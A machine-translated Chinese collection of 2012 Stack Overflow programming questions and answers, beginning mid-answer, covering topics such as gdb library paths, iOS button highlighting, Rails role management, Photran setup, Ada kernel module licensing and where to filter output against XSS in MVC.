Kelvin 记得 Metro 不仅适用于 PC。它还针对平板电脑（移动设备），其中 CPU 的每一秒工作都是电池成本。更好的应用程序 = 更少的电池成本。移动应用程序应该是精简的、快速的，并且当它们不需要做某事时做的比更多：) 这就是为什么只支持 SQLite，这就是为什么你不能使用繁重而复杂的数据库服务器的原因。如果你想使用一个完整的 DB JP 就是说实话。您需要使用 Azure。我在我的应用程序中这样做，它工作得很好。您的应用程序将运行更顺畅，因为所有数据库操作都在 Azure 上完成，这对您的应用程序有好处。

但最重要的是。您需要记住 Metro 应用程序 = 普通 PC，但也有平板电脑，也许还有手机。如果你想在 Win7 上创建一个复杂的桌面应用程序，让它成为一个普通的桌面应用程序，不要尝试将它推送到 Metro。并非每个桌面应用程序都是 Metro 应用程序的好材料

# html5boilerplate - H5BP 在 IE 中加载缓慢

> ID：11927561
> 
> 赞同：0
> 
> 时间：2012-08-13T02:32:12.383
> 
> 标签：html5boilerplate

有没有人经历过在 IE 中加载超慢的 HTML5 样板文件？我正在使用它构建一个网站，在 FF 中一切都很好，但是当我尝试在 IE 中打开它时，加载需要一分钟多的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T06:46:49.570

这是因为协议相关的 URL。您可以在 v4.0.1 的HTML5[样板常见问题解答中找到更多信息](https://github.com/h5bp/html5-boilerplate/blob/25c1073d13eb49a948d7040525ba656d93aece30/doc/faq.md)

# debugging - 为什么我无法在 emacs gdb-mode 中调试从 procps 包构建的免费程序？

> ID：11927562
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:32:26.913
> 
> 标签：debugging, emacs, gdb, shared-libraries

> **可能重复：**
> [gdb 说“无法打开共享对象文件”](https://stackoverflow.com/questions/932384/gdb-says-cannot-open-shared-object-file)

这个免费程序是 [procps 包]：http://procps.sourceforge.net/procps-3.2.8.tar.gz 提供的命令[的](http://procps.sourceforge.net/procps-3.2.8.tar.gz)一部分

我已经设置了`LD_LIBRARY_PATH=/home/hugemeow/workspace/linuxc/packages/procps-3.2.8/proc`，所以我可以在 eshell 中调试这个免费的命令，

```
Mx shell
gdb free
br main
r
// the debug works well here 
```

但是当我尝试在 emacs 的 gdb 模式下调试时，我无法调试这个程序。

当我打

```
r
Enter 
```

错误刚刚出现，它显示`"error while loading shared libraries: libproc-3.2.8.so"`， ![在 emacs 的 gdb-mode 中调试 free 命令失败](../Images/08f2695fb4bc92f4f148e0a105e52306.png)

但我有设置`LD_LIBRARY_PATH`，它在 eshell 中运行良好，那么我无法调试免费命令的原因是什么？为了在 emacs 的 gdb 模式下调试免费命令，我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T06:20:07.593

> 加载共享库时出错：libproc-3.2.8.so

GDB 没有停止的原因`main`是因为`main`从未执行过。该`free`程序需要`libproc-3.2.8.so`加载，而动态链接器（负责加载它）找不到它。因此，动态加载程序甚至在程序的第一条指令执行之前就退出了程序。

您*必须*设置环境，以便动态加载器*可以*找到所需的库。最简单的方法是在系统上*正确*安装`libproc-3.2.8.so`。一个稍微困难的方法是设置`LD_LIBRARY_PATH`通过`libproc-3.2.8.so`它找到的。例如：

```
(gdb) set env LD_LIBRARY_PATH /path/to/libproc/lib
(gdb) run 
```

> 我已经设置了 LD_LIBRARY_PATH

您可能是在开始*之后*`emacs`执行了上述操作，或者您是`emacs`通过菜单或应用程序启动器启动的，而*不是*通过从`LD_LIBRARY_PATH`设置的 shell 中调用来启动的。环境变量不会被在设置环境变量之前启动的进程或从不同的 shell 启动的进程继承。

# iphone - 如何将 UIButton 的高亮属性设置为 NO？

> ID：11927565
> 
> 赞同：0
> 
> 时间：2012-08-13T02:33:13.900
> 
> 标签：iphone, ios, interface-builder, uibutton

虽然我正在触摸`UIButton`如何使它不突出显示。但是，我不想完全避开突出显示的功能。我只想在开始拖动时使突出显示的停止。我试过这个

```
-(IBAction)stopHighlighting:(UIButton *)sender// i hooked this up to IB for touchDragInside
{

sender.highlighted=NO;
//this doesnt work at all
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:45:06.607

问题是系统会覆盖你的逻辑。*它在使图像变暗以突出显示之前*调用目标方法，因此基本上您将其设置为`NO`，然后将其设置回`YES`，您将什么也看不到。你有两个选择：

1) 使用 dispatch_async 将您的呼叫延迟到突出显示，直到系统设置它之后。

2）禁用运行时突出显示并手动切换图像。

# objective-c - iOS：内存警告使按钮消失

> ID：11927569
> 
> 赞同：0
> 
> 时间：2012-08-13T02:34:14.970
> 
> 标签：objective-c, ios, memory, warnings, memory-leaks

我在 iPod touch 上运行我的 iOS 应用程序，我似乎收到了很多内存警告。不知道为什么会这样，我使用过 Instruments 并且我没有使用那么多内存。无论如何，有时在收到内存警告后，工具栏上的一些 UIBarButtonItems 会消失（例如，导航控制器中的后退按钮）。

这是一个真正的问题，唯一的解决方法是杀死应用程序并重新启动。我该如何处理这种情况？也许有一种方法可以重新加载栏按钮项目？有没有人遇到过类似的情况，您将如何进行？

谢谢你的帮助。

编辑：我应该补充一点，我的 UIBarButtonItems 有自定义图像。我在 viewDidLoad 中设置了这些图像。也许内存不足警告会释放这些图像，然后它们就不会再次加载。我想可能是这样，但是我如何确保如果视图再次出现，图像会再次加载？

EDIT2：问题似乎是在 viewDidUnload 我将 BarButtonItems 之一设置为 nil。我认为这实际上是在我设置 IBOutlet 时由 XCode 自动插入的。这是正确的做法，还是我不应该将其设置为零。如果是这样，我以后如何正确重新分配它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:43:50.773

如果您在本地设置图像并且没有对它们的强引用，那么一旦超出范围，它们就会被操作系统视为“一次性”。当收到内存警告时，它们被释放。尝试保持对图像的更大范围的参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:42:41.840

与其治疗症状（UIBarButtons 消失），不如尝试找出您的程序在哪里泄漏内存。以下是查找内存泄漏的一些提示：

1.  浏览您的代码并找到您 malloc 的所有实例并确保您正在解除分配
2.  使用分析器查找内存泄漏，大多数情况下它会命名未正确释放的对象。
3.  查看有关查找泄漏的[演示文稿。](http://www.streamingcolour.com/blog/2010/09/21/presentation-finding-fixing-mem-leaks/)

最后，在您确定没有出现内存泄漏和那些警告，但您的按钮仍然消失之后，请在新问题中发布一些代码。

# ruby-on-rails - 使用 cancan 和 rolify 进行角色管理

> ID：11927570
> 
> 赞同：2
> 
> 时间：2012-08-13T02:34:29.867
> 
> 标签：ruby-on-rails, devise, roles, cancan

我正在使用 devise-cancan-rolify 设置来处理用户。在注册时，他们会获得一个读者角色。我希望能够从管理界面将他们提升为作家角色。问题是，角色和 users_roles 表的设置方式使这变得相当复杂，特别是因为没有 users_roles 模型而且我相当业余。有没有熟悉这个的人可以在这里指导我正确的方式？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-13T18:00:32.537

我希望你确实看到[了这个](https://github.com/EppO/rolify/wiki/Tutorial)关于 devise + cancan + rolify 设置的教程。

如果您确实遵循了这些步骤，您应该拥有用户、角色和 users_roles 表。您不需要 users_roles 模型。

您需要做的第一件事是确保您可以分配和检查用户的角色。

您应该能够在继续之前运行这些代码（从文档的使用部分，在任何用户的控制台中尝试这些代码）

```
user.add_role "admin"
user.has_role? :admin 
```

如果这对你有用，现在你需要为新用户分配读者角色，最好的地方是 after_create 回调：

```
class User
  after_create :assign_reader_role
private
  def assign_reader_role
    self.add_role "reader"
  end
end 
```

下一步是从管理界面创建添加/删除作者角色。

只需在您的 UsersController 中添加两个操作

```
def assign_writer_role
  @user = User.find(params[:id])
  @user.add_role "writer"
  redirect_to @user
end

def remove_writer_role
  @user = User.find(params[:id])
  @user.remove_role "writer"
  redirect_to @user
end 
```

就这样。

我希望这有帮助。

# javascript - 如何创建从 javascript 到 json WCF 服务的安全登录？

> ID：11927571
> 
> 赞同：0
> 
> 时间：2012-08-13T02:34:30.990
> 
> 标签：javascript, json, wcf, login

我使用 Phonegap + jQuery Mobile 创建了一个 android 应用程序，并使用 WCF + JSON 响应创建了一个 Web 服务。我想为我的 android 应用程序创建一个登录表单，然后通过 JSON 发送登录数据并在我的 WCF 服务中进行身份验证。如何为这种情况创建安全登录？

# azure - 如何为 Azure 表存储查询允许 GZIP

> ID：11927572
> 
> 赞同：1
> 
> 时间：2012-08-13T02:34:59.970
> 
> 标签：azure, azure-table-storage

我在查询 Azure 表存储时发现，payload 没有 gzip 传输。

这是提琴手检查的标题

**发送：**

```
GET http://account.table.core.windows.net/sometable() HTTP/1.1
User-Agent: Microsoft ADO.NET Data Services
DataServiceVersion: 2.0;NetFx
MaxDataServiceVersion: 2.0;NetFx
x-ms-version: 2011-08-18
x-ms-date: Mon, 13 Aug 2012 02:23:48 GMT
Authorization: SharedKeyLite xxxxxxxxxxxxx=
Accept: application/atom+xml,application/xml
Accept-Charset: UTF-8
Host: account.table.core.windows.net 
```

**收到**

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: application/atom+xml;charset=utf-8
Server: Windows-Azure-Table/1.0 Microsoft-HTTPAPI/2.0
x-ms-request-id: 254e470e-c50d-409b-8429-3d5bc9beabaa
x-ms-version: 2011-08-18
Date: Mon, 13 Aug 2012 02:23:37 GMT
Content-Length: 168553 
```

长度为 168K 的 xml 内容，如果 gzip 压缩，只有 40k 左右，所以，我的问题是：我在哪里以及如何允许 gzip 用于 Azure 表查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:22:19.023

我认为 Windows Azure 存储不支持压缩。

# ruby-on-rails-3 - 有没有办法为简单表单集合中的选项提供单独的样式类

> ID：11927573
> 
> 赞同：1
> 
> 时间：2012-08-13T02:35:03.587
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.1, simple-form

我有

```
<%= f.input :user_type, :label_html => { :class => 'option_label_name' }, :label => "User Type" ,:collection => [["Master"], ["HO Administrator"], ["Practice Manager"], ["Branch Administrator"], ["Consultant"]], :include_blank => false %>
</div> 
```

这将创建一个包含许多选项的列表，所有这些都很好，但我想知道是否有任何方法可以仅为集合元素提供 CSS 样式类...

与当前形式一样，样式仅提供给标签，而不提供给选项...

我找到了一种解决方案……它不是我要寻找的解决方案，但这确实有效……

```
<div id="innerblock_left">
<%= f.label :user_type, :class =>"label_name", :label => "User Type" %>
<select class="style2">
<option value="1">Master</option>
<option value="2">HO Administrator</option>
<option value="3">Practice Manager</option>
<option value="4">Branch Administrator</option>
<option value="5">Consultant</option>
</select>
</div> 
```

尽管如果有人知道如何为简单的表单集合元素提供样式，那就太好了……

谢谢你的阅读。。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-19T08:30:58.707

0只是一个简单的解决方案：

在您的表单助手中，定义集合：

```
def list
  [["Master",:class => "d_1"], ["HO Administrator",:class => "d_2"], ["Practice Manager",:class => "d_0"],["Branch Administrator",:class => "d_2"], ["Consultant",:class => "d_2"]]
end 
```

以您的形式：

```
<%= f.input :user_type, :label_html => { :class => 'option_label_name' }, :label => "User Type" ,:collection => list, :include_blank => false %> 
```

并在您的资产中添加一些 CSS 技巧：

```
.d_0 {
  font-weight: bold; }
.d_1{
  font-style: italic;
  text-decoration: underline;
  padding-left: 10px;}
.d_2 {
  font-style: italic;
  padding-left: 20px;} 
```

# objective-c - 重复图像时如何避免时间流逝？

> ID：11927576
> 
> 赞同：0
> 
> 时间：2012-08-13T02:35:33.673
> 
> 标签：objective-c, cocos2d-iphone, nsmutablearray, ccsprite, repeat

我有 3 张图片，我想一个接一个地重复它们。当图层向左移动时，第一个图像不再可见，并且该图像在右边最后一个图像之后占据新位置，因此第一个图像成为第三个图像，并且重复动画。

我的问题是，**有时会有一点时间流逝**，我认为它发生在第一张图像被删除并放在第三个位置时。我们几乎没有注意到它，但它有点“暂停”动画 0.1 秒，我想避免这种情况。

你知道怎么做吗？我已经尝试过使用此代码（删除图像并再次插入），或者只是替换为`replace...atIndex`但我遇到了同样的问题。代码是：

```
if (offsetParam <= offset1-spriteWidth){
        CCSprite *temp = [[sprites objectAtIndex:0] retain];
        [sprites removeObjectAtIndex:0];
        [sprites addObject:temp];
        temp.position = ccp(-offset1+(2*spriteWidth), temp.position.y);
        [temp release];

        offset1 -= spriteWidth;
 } 
```

任何的想法 ？

谢谢

* * *

编辑：使用计数器，物体不会移动？（我曾尝试使用“保留”以防万一，但无论有没有它，我都得到了相同的结果）

```
if (rightDirection){
    //RIGHT
    CCLOG(@"offsetParam %f, offset1-spriteWidth %f", offsetParam, offset1-spriteWidth);
    if (offsetParam < offset1-spriteWidth){ //move the block to the right

        CCSprite *temp = [[grasses objectAtIndex:counterGrass] retain];
        counterGrass++;
        if (counterGrass>2) counterGrass = 0;
        temp.position = ccp(offset1+(2*spriteWidth), temp.position.y);//does not work
        [temp release];
        offset1 -= spriteWidth;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:52:09.190

“精灵”是 CCArray 还是 NSMutableArray 类型的？因为 CCArray 与 removeObjectAtIndex 存在严重的性能问题，特别是如果索引较低（在数组的开头），如您的情况。

您可以尝试切换到 NSMutableArray 看看是否有帮助。

或者，避免使用 remove 和 add，因为它是多余的。而是使用索引计数器来告诉您哪个数组索引是第一个精灵。当索引 >= sprites 数组中的项目数时，将其重置为 0。

# fortran - 为 Fortran 使用 Eclipse

> ID：11927579
> 
> 赞同：1
> 
> 时间：2012-08-13T02:36:25.787
> 
> 标签：fortran, photran

我在这里有一个关于如何为 Fortran 设置 Eclipse 的简短问题。

我已经下载了“Photran”（Eclipse 的 Fortran 工具）并安装了它。我遇到的问题是，每次我尝试运行一个程序时，我都会收到一条消息，上面写着`"Launch failed. Binary not found."` 然后，我发现你必须先“构建”文件，所以当我尝试这样做时，我收到一条消息显示以下内容的控制台：

```
**** Build of configuration Debug for project Fortran2 ****

make all 
/bin/sh: gfortran: command not found
Building file: ../Src/helloworld.f90
make: *** [Src/helloworld.o] Error 127
Invoking: GNU Fortran Compiler
gfortran -funderscoring -I/usr/locl/bin -O0 -g -Wall -c -fmessage-length=0 -o "Src/helloworld.o" "../Src/helloworld.f90"

**** Build Finished **** 
```

有人对如何使它工作有任何指示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-11-20T17:01:57.250

你在 OSX 上吗？

如果是这样，我发现问题是 OSX 没有将 PATH 变量传递给通过 GUI 启动的应用程序。因此，要解决这个问题，应该从终端启动 Eclipse。当我遇到问题时，这很有效。

有一种方法可以设置此处解释的 GUI 启动应用程序的路径，尽管我自己没有遵循这一点。[http://overwatering.org/blog/2012/08/setting-path-osx-mountain-lion/](http://overwatering.org/blog/2012/08/setting-path-osx-mountain-lion/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T10:31:23.457

```
ln -s /usr/local/gfortran/bin/gfortran /usr/bin/gfortran 
```

这对我有用。Photran/Eclipse 现在与 gfortran 一起运行，没有任何抱怨。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-23T23:10:58.773

您可能需要安装 gcc-gfortran，您应该可以使用包管理器找到它。

gcc-gfortran 包提供了“gfortran”，它实际上是编译 FORTRAN（至少在 Fedora 上是这样）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-11-05T04:08:17.833

链接方法在 OSX 10.12.1 Sierra 中对我不起作用，但从终端启动 Eclipse 确实有效（假设 Eclipse.app 在应用程序中，`/Applications/Eclipse.app/Contents/MacOS/eclipse`在终端中输入）。

# python - pyexcelerator：如何按工作表名称删除 excel 工作表

> ID：11927582
> 
> 赞同：1
> 
> 时间：2012-08-13T02:36:52.027
> 
> 标签：python, excel, pyexcelerator

如题，我使用**pyexcelerator**来操作excel文件。

代码：

```
from pyExcelerator import parse_xls
fpath='D:\\Capacity_20120811.xls'
eData=parse_xls(fpath)

>>> eData
[(u'testExcelReport_hr',
  {(0, 0): u'Deletetime',
   (0, 1): u'Food',
   (0, 2): u'Peak Rate',
   (0, 3): u'Total Bytes',
   (0, 4): u'Total Msg No',
   (1, 0): u'20110824T05',
   (1, 1): u'111BSA',
   (1, 2): 6255326.0,
   (1, 3): 16226057.0,
   (1, 4): 127.0,
   (2, 0): u'20110824T06',
   (2, 1): u'111BSA',
   (2, 2): 352978.0,
   (2, 3): 672104.0,
   (2, 4): 2124.0})] 
```

我想删除工作表`sheetname:'testExcelReport_hr'`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:52:05.350

您可以为此使用列表推导：

```
eData = [(sheet_name, sheet_data) for (sheet_name, sheet_data) in eData
         if sheet_name != u'testExcelReport_hr'] 
```

这会保留所有工作表，但名为 的工作表除外`testExcelReport_hr`，实际上是删除了该工作表。

# css - 在具有固定位置的元素上隐藏溢出

> ID：11927583
> 
> 赞同：9
> 
> 时间：2012-08-13T02:36:59.990
> 
> 标签：css, web, position, overflow

有没有办法用容器隐藏**固定div 的溢出？**我认为 fixed inside fixed 会做到这一点，但似乎并非如此。我能想到的唯一解决方法是“反转”掩码：其他固定的 div 隐藏了它*周围*的所有内容，但如果有任何其他解决方案会更好。

这是小提琴：http: [//jsfiddle.net/pjFa6/1/](http://jsfiddle.net/pjFa6/1/)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T03:48:07.373

不幸的是，似乎不可能将一个固定元素嵌套在另一个元素中（无论是否固定），并期望外部元素将其包裹并隐藏任何溢出。

我唯一能想到的是将内部 div 设置为`position:absolute`而不是固定。这是基于您的 jsfiddle 的示例：[jsfiddle.net/pjFa6/15](http://jsfiddle.net/pjFa6/15)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-04T20:06:06.773

在某些移动浏览器上下文中，使用`-webkit-overflow-scrolling: touch`可以实现“裁剪”的固定位置元素。见：[https ://miketaylr.com/posts/2015/06/position-fixed-overflow-hidden.html](https://miketaylr.com/posts/2015/06/position-fixed-overflow-hidden.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-12T04:28:00.653

with`z-index: any value;`容器中的声明将在某些 webkit 浏览器中执行，例如 chrome。

# asp.net-mvc-4 - 集成测试和单元测试（WEB API mvc 4）

> ID：11927587
> 
> 赞同：5
> 
> 时间：2012-08-13T02:37:33.150
> 
> 标签：asp.net-mvc-4, integration-testing, asp.net-web-api

在 APIController 上进行测试时，集成测试和单元测试如何相关？以及如何在集成测试中创建 webrequest 时模拟存储库，使其不对数据库进行实际查询？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T10:27:45.817

您可以使用[自托管](http://code.msdn.microsoft.com/ASPNET-Web-API-Self-Host-30abca12)功能启动控制器并使用该`OpenAsync().ContinueWith(t => { /* ... */ })`功能运行您的测试。你会想要覆盖`Configuration.DependencyResolver`和覆盖，`IHttpControllerActivator`这样你就可以指定你自己的模拟实现（例如，你可以使用 Ninject 来检索已经与模拟实现绑定的特定控制器）。

# c# - 为 silverlight 客户端应用程序使用基于 udp 的套接字通信

> ID：11927589
> 
> 赞同：0
> 
> 时间：2012-08-13T02:37:40.263
> 
> 标签：c#, .net, silverlight, sockets

我已经开始考虑在 silverlight 框架上开发浏览器应用程序。

我需要使用 System.Net.Sockets 命名空间中的套接字类通过 UDP 执行套接字通信。

不幸的是，在创建新的套接字对象时，我看不到 UDP 的 ProtocolType 选项选项。

然后我使用哪个类库进行 udp 套接字通信？我想要做的就是能够以迭代方式将 udp 数据包发送到一组 IP 地址 - 将 udp 数据包发送到一个 IP 地址并等待响应（如果有），然后转到下一个。

请指教。

提前致谢，

副部

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T17:57:47.747

您可以向*本地网络外部的源***发送** *单播*udp 数据包，并且可以在本地网络*内***发送**和**接收***多播*udp 数据包（因为多播网络支持通常在本地网络之外结束）。

 *******您无法从任何地方接收单播 udp 数据包。

还有一些安全限制类似于您所知道的 Web 请求的安全限制。

这使得 Silverlight 中的 udp 支持非常有限，并且没有可用于解决此问题的 Silverlight 库。

如果您的 Silverlight 5 应用程序以提升的权限运行，或者可能更容易做到，在本地网络中有一个外部应用程序用作 udp 流量的代理并通过 udp 与 Silverlight 客户端通信，您也可以使用 P/Invoke 调用 win32 库多播。*******

# c - 为 linux 内核中的模块设置许可证

> ID：11927590
> 
> 赞同：7
> 
> 时间：2012-08-13T02:37:46.670
> 
> 标签：c, linux-kernel, ada

我在 Ada 中编写了一些内核模块，但遇到了一些问题。许可证被定义为 ac 宏，我无法弄清楚它实际上是什么。如果 c 和 ada 模块都具有 GPL 兼容许可证，那么简单地让一些 c 重新导出所有需要 GPL 的 c 函数是一个合适的解决方案吗？有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T09:35:29.013

我不确定这个问题是否是个玩笑，但如果你真的想在 Ada 中编写内核模块，那么我无法想象与你必须拥有的其他一切相比，设置模块许可证是一个很大的障碍打。

在任何情况下，模块许可证只是 .ko 文件的 .modinfo 部分中的“license=GPL”之类的字符串。在 C 代码中，它是由 from 的`__MODULE_INFO()`宏构建的`<linux/moduleparam.h>`，它只是创建一个数组，该数组`char`设置为上面的字符串，标记为`__attribute__((section(".modinfo")))`。

我猜想在 Ada 中可能有一些类似的方法可以做到这一点；如果没有，在最坏的情况下，应该可以使用链接描述文件。大概，无论如何，您已经有某种处理方法，可以设置 .modinfo 部分的“vermagic=XXX”部分。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-13T14:38:22.583

处理 C 宏是一个皇家 PITA。我有一个梦想，有一天 C 程序员会帮世界其他人一个忙并停止使用它们。

如果是我，我会运行宏来查看它输出的内容，然后编写一些 Ada 代码来输出等价的内容。

通过阅读 Roland 的回答，在我看来，可能需要实现定义的[编译指示 linker_section 。](http://docs.adacore.com/gnat-unw-docs/html/gnat_rm_2.html#SEC77)

> pragma Linker_Section ( [Entity =>] LOCAL_NAME, [Section =>] static_string_EXPRESSION);
> 
> LOCAL_NAME 必须引用在库级别声明的对象。此编译指示指定给定实体的链接器部分的名称。它等效`__attribute__((section))`于 GNU C 并导致 LOCAL_NAME 放置在可执行文件的 static_string_EXPRESSION 部分（假设链接器不重命名该部分）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-14T08:20:34.343

作为回避问题的一种方法，您能否将许可证部分保留在 C 中并使用[附件 B](http://www.adahome.com/rm95/rm9x-B-03.html)（与其他语言的接口）功能来访问它？

这至少应该包含问题，并允许您继续使用其他模块。

充其量它可能允许您在 Ada 中检查许可证的外观并以这种方式对其进行逆向工程。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-13T11:04:48.523

由于您可能正在使用 GNAT，因此您可以使用[*pragma License*](http://gcc.gnu.org/onlinedocs/gnat_rm/Pragma-License.html) “允许针对标准和修改后的 GPL 自动检查适当的许可条件”。

# ios - 防止 UITableViewCell 中的 UIButtons 被单元格选中

> ID：11927591
> 
> 赞同：0
> 
> 时间：2012-08-13T02:37:52.753
> 
> 标签：ios, uitableview, uibutton

我在其内容视图中`UITableViewCell`有一个自定义。`UIButton`当我点击单元格以选择它时，按钮的背景图像也会切换到其突出显示状态。我尝试通过`-setSelected:animated:`在单元格中实现来防止它，如下所示：

```
- (void)setSelected:(BOOL)selected animated:(BOOL)animated
{
    [super setSelected:selected animated:animated];

    [[self exampleButton] setSelected:NO];
} 
```

没有这样的运气；该按钮仍会更改其样式。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:16:06.533

使用`exampleButton.adjustsImageWhenHighlighted = NO`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-10T11:49:40.030

我认为您应该更改未选中的突出显示状态。

```
- (void)setHighlighted:(BOOL)highlighted animated:(BOOL)animated
{
    [super setHighlighted:highlighted animated:animated];
    _exampleButton.highlighted = NO;
}

- (void)setSelected:(BOOL)highlighted animated:(BOOL)animated
{
    [super setSelected:highlighted animated:animated];
    _exampleButton.highlighted = NO;
} 
```

# objective-c - 从另一个控制器目标 C 调用实例方法

> ID：11927592
> 
> 赞同：0
> 
> 时间：2012-08-13T02:38:21.863
> 
> 标签：objective-c, xcode, properties, methods, controllers

我有两个文件，我试图在它们之间传递一些信息。基本上我有一个布尔属性，我用它来决定我应该使用方法的哪一部分。我创建了一个实例方法，该方法返回此布尔属性以供查看。在我的第一个控制器中，我创建属性并设置它并创建方法，在我的第二个控制器中，我创建该类的一个实例并调用该方法以查看 BOOL 的值。问题是当我调用它时我没有得到正确的答案，我总是得到0。有人可以解释为什么吗？谢谢。在第二个文件中，我有一个使用注释的 mapView，因此在单击地图上的图钉时会调用 title 属性

第一个文件：TableViewController

```
#import "MyTableViewController.h"
#import "FlickrFetcher.h"
#import "myTableViewControllerPhotoLocation.h"
#import "FlickrImageViewController.h"
#import "FlickrPhotoSort.h"
#import "MapViewController.h"
#import "FlickrPhotoAnnotation.h"

@interface MyTableViewController () <MapViewControllerDelegate>
//This is declared in header
@property bool photoStage;
@end

@implementation MyTableViewController
@synthesize photoStage= _photoStage;

-(BOOL) currentPhotoStage{
NSLog(@"PhotoStage = %@", self.photoStage);
return self.photoStage;

}

-(void) setphotoStage: (bool) photoStage{
if(!_photoStage) _photoStage = NO;
else {
    _photoStage = photoStage;
}

 }

-(NSArray*) mapAnnotations{

NSMutableArray *annotations= [NSMutableArray arrayWithCapacity:[self.photoArray count]];
for(NSDictionary *photo in self.photoArray)
{
[annotations addObject:[FlickrPhotoAnnotation annotationForPhoto:photo]];
}
//I set the value of self.photoStage here
self.photoStage = YES;
//Prints out 1
NSLog(@"%d", self.photoStage);
return annotations;

 } 
```

第二个文件名为 PhotoAnnotation

```
#import "FlickrPhotoAnnotation.h"
#import "FlickrFetcher.h"
#import "MapKit/Mapkit.h"
#import "MapViewController.h"
#import "MyTableViewController.h"

@interface FlickrPhotoAnnotation ()
@property (nonatomic,strong) MyTableViewController* mapCheck;
@end

@implementation FlickrPhotoAnnotation
@synthesize photo=_photo; //This is a dictionary
@synthesize mapCheck = _mapCheck; 
```

这里出现问题

```
-(NSString*) title{ //gets called on click of annotation in map
// ALWAYS RETURNS 0 hence if statement fails
NSLog(@"photoStage = %d", [self.mapCheck currentPhotoStage]);
if([self.mapCheck currentPhotoStage])
{
    NSLog(@"title = %@", [self.photo objectForKey:FLICKR_PHOTO_TITLE]);
    NSString *title = [self.photo objectForKey:FLICKR_PHOTO_TITLE];
    if([title isEqualToString:@""]) title = @"No Title";
    NSLog(@"title = %@", title);
    return title;
}else {

NSString * cellTitle = [self.photo objectForKey:@"_content"]; 

NSRange cellRange = [cellTitle rangeOfString:@","];

NSString * cellMainTitle = [cellTitle substringToIndex:cellRange.location];

return cellMainTitle;
//[self.photo objectForKey:FLICKR_PHOTO_TITLE];
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:47:03.043

您总是得到 0 的原因是因为您创建了 MyTableViewController 的一个新实例——它与您设置值的实例不同（因为属性设置为 0 或 nil 直到您更改它们，这就是您得到 0 的原因）。您需要获取对您的第一个视图控制器的引用——我不确定如何，这取决于您的应用程序的整体结构。另一种方法是使用通知。

# r - 树状图高度太长

> ID：11927595
> 
> 赞同：1
> 
> 时间：2012-08-13T02:38:45.063
> 
> 标签：r, heatmap

我使用下面的 R 代码获取了一些数据的热图；热图在列的顶部显示了一个树状图，但我宁愿树状图的长度更短，以便在底部留出足够的空间一些长列标签的热图。有没有办法调整树状图的长度？

```
<- heatmap.2(t(mully), scale="none", Rowv=F,
   col = myCol, 
   breaks = myBreaks, 
   dendrogram="row",  
   margins=c(0.55,8.4), cexRow=0.68, cexCol=0.9, key=FALSE,
   labCol =NULL,
   trace="none") 
```

我很乐意得到一些帮助。

詹姆士

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T07:09:53.423

您可以尝试`pheatmap`使用包来绘制热图。

```
 pheatmap(t(mully), colors = myCol, breaks = myBreaks) 
```

如果矩阵太大而无法正确放入绘图窗口，则可以修复单元格的高度和宽度并将结果写入文件。这确保了绘图的所有相关部分都是可见的。

```
 pheatmap(t(mully), colors = myCol, breaks = myBreaks, cellheight = 10, 
    cellwidth = 10, filename = "example.png") 
```

# model-view-controller - 您应该在哪个 MVC 层上过滤 XSS 的输出？

> ID：11927597
> 
> 赞同：0
> 
> 时间：2012-08-13T02:39:02.097
> 
> 标签：model-view-controller, web-applications, xss

我正在用 PHP 编写一个调用几个 API 的 Web 应用程序。这些 API 中的内容不可信，我想在将其显示给用户之前对其进行过滤以进行 XSS。哪个 MVC 层适合执行 XSS 过滤器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T03:40:22.070

**表示层。**准确地查看实例。在他们为模板赋值之前。

XSS 是一种与响应格式相关的东西。例如，如果您的视图正在创建 JSON 响应，则它不会具有与 HTML 响应相同的潜在弱点。这又与检查完全不同，您在仅发送 HTTP 标头作为响应之前所做的检查。

**PS**视图不是模板。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T20:24:49.423

我想说答案有点复杂，也取决于偏好。过滤的第一步是输入验证。我们可以选择在将值分配给模型之前在控制器中进行输入验证，或者我们可以通过注释模型字段将验证规则放入模型本身，并让模型自行验证。

现在输入验证是关于确保数据根据我们的域是有效的。对于用户名字段，我们可能不希望其中包含脚本标签。但是，在某些地方，脚本标签是完全有效的数据，甚至不会受到攻击。一个这样的例子就是这个站点，stackoverflow。对于评论或问题字段，我们需要允许 script 标签，因为它们作为用户数据是有效的。但是，我们需要确保脚本不会被解释为代码，而是保留数据。这将我们带到答案的第二部分——编码。

当我们编码时，我们需要根据上下文进行编码。如果我们在这样的 javascript 变量中输出：

```
<script> var a = 'INPUT_HERE'</script> 
```

我们需要使用与在 HTML 标记之间输出不同的编码：

```
<h1>INPUT_HERE</h1> 
```

